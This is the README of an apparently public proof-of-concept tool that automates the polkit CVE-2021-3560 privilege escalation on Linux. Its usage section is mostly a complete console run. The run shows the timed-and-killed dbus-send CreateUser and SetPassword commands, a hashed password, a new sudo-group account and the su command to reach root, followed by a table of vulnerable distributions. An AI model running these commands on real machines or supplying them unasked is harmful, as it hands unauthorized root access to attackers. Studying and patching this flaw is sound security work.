# polkit-auto-exploit
Automatic Explotation PoC for Polkit CVE-2021-3560

# Summary 

CVE-2021-3560 is an authentication bypass on polkit, which allows unprivileged user to call privileged methods using DBus, in this exploit we will call 2 privileged methods provided by accountsservice (CreateUser and SetPassword), which allows us to create a priviliged user then setting a password to it and at the end logging as the created user and then elevate to root.
https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/

# Usage

```
ubuntu@ubuntu2004:~/polkit-auto-exploit$ ./polkit-auto-exploit -u adminhs -p admin1 -f admin
[===] Auto Exploitation PoC for Polkit CVE-2021-3560 by Petruknisme [===]
[+] Current User: ubuntu
[+] Variable for Polkit Configuration
[*] Username : adminhs
[*] Password : admin1
[*] Fullname : admin
[+] Sending create user command to determine time execution
[*] Execution time: 0.018076ms
[+] Time to killing dbus-send setting to 0.009038ms
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:adminhs string:'admin' int32:1 & sleep 0.009038s ; kill $!
..................
[+] GOTCHAAA! User adminhs is created with sudo member group
[+] Getting UID from user: 1015
[+] Creating password with OpenSSL
$5$wwCpZi2.onsiKa6b$B/OovlhfvFWs65EdYnk/1sL.sYSzfPXd1s6ZpurHNr0
[+] Triggering polkit to create password for adminhs
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1015 org.freedesktop.Accounts.User.SetPassword string:'$5$wwCpZi2.onsiKa6b$B/OovlhfvFWs65EdYnk/1sL.sYSzfPXd1s6ZpurHNr0' string:admin & sleep 0.009038s ; kill $!
Failed to execute command: echo admin1 | su -c id adminhs
uid=1015(adminhs) gid=1015(adminhs) groups=1015(adminhs),27(sudo)

[+] GOTCHAAA! Success login with User adminhs & password: admin1
[+] You can login to root using su with user and password created before: su -c 'sudo su' adminhs
```

# Tested 

- Ubuntu 20.04(policykit-1/focal,now 0.105-26ubuntu1)

# Information

Any system that has polkit version 0.113 (or later) installed is vulnerable. That includes popular distributions such as RHEL 8 with polkit version `0.115` and Ubuntu 20.04 with polkit version `0-105-26` (Debian fork of polkit)

# Vulnerable Distro

<table>
  <tbody>
    <tr>
      <th>Distribution</th>
      <th>Vulnerable?</th>
    </tr>
    <tr>
      <td>RHEL 7</td>
      <td>No</td>
    </tr>
    <tr>
      <td>RHEL 8</td>
      <td>
        <a
          href="https://access.redhat.com/security/cve/CVE-2021-3560"
          rel="noopener"
          target="_blank"
          >Yes</a
        >
      </td>
    </tr>
    <tr>
      <td>Fedora 20 (or earlier)</td>
      <td>No</td>
    </tr>
    <tr>
      <td>Fedora 21 (or later)</td>
      <td>
        <a
          href="https://bugzilla.redhat.com/show_bug.cgi?id=1967424"
          rel="noopener"
          target="_blank"
          >Yes</a
        >
      </td>
    </tr>
    <tr>
      <td>Debian 10 (“buster”)</td>
      <td>No</td>
    </tr>
    <tr>
      <td>Debian testing (“bullseye”)</td>
      <td>
        <a
          href="https://security-tracker.debian.org/tracker/CVE-2021-3560"
          rel="noopener"
          target="_blank"
          >Yes</a
        >
      </td>
    </tr>
    <tr>
      <td>Ubuntu 18.04</td>
      <td>No</td>
    </tr>
    <tr>
      <td>Ubuntu 20.04</td>
      <td>
        <a
          href="https://ubuntu.com/security/CVE-2021-3560"
          rel="noopener"
          target="_blank"
          >Yes</a
        >
      </td>
    </tr>
  </tbody>
</table>

# License 

MIT License